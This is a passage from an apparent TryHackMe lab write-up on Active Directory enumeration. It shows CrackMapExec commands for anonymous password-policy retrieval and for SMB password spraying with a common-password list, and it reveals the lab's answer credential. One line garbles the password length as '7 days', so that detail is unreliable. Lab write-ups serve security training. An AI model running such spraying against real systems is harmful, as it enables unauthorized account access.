**CrackMapExec** is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command: `crackmapexec smb 10.211.11.10 --pass-pol`

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

The minimum psw length is: 7 days.

### 5.2 - What is the locked account duration?

While the locked account duration is: 2 minutes.

#### Performing Password Spraying Attacks

We have gathered a solid user list from our user enumeration in the previous task; we now need to create a small list of common passwords.\
Through our password policy enumeration, we saw that the password complexity is equal to 1:

* In **rpcclient**: `password_properties: 0x00000001`
* With **CrackMapExec**: `Password Complexity Flags: 000001`

This means that at least three of the following four conditions need to be respected for a password to be created:

1. Uppercase letters
2. Lowercase letters
3. Digits
4. Special characters

### 5.3 - Perform password spraying using CrackMapExec. What valid credentials did you find? (format: username:password)

Based on the last output psw policy info, THM suggests us the following passwords:

* `Password!`
* `Password1`
* `Password1!`
* `P@ssword`
* `Pa55word1`

We can use **CrackMapExec** to run our password spraying attack against the WRK computer:

```bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```
rduke:Password1! 
```

## Task 6 - Conclusion

In this room, we focused on various types of reconnaissance and enumeration activities that don’t require valid credentials. We covered mapping out the network, discovering and enumerating SMB shares, LDAP, RPC, and others. Finally, we explained password spraying and the various tools to carry out such attacks.

Active Directory remains a complex topic and you are encouraged to check other rooms to build and beef up your skills in Active Directory penetration testing. For more practice and going more in-depth, you can check the [Breaking Windows](https://tryhackme.com/module/breakingwindows) and the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) modules in addition to the [next room](https://tryhackme.com/room/adauthenticatedenumeration).

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
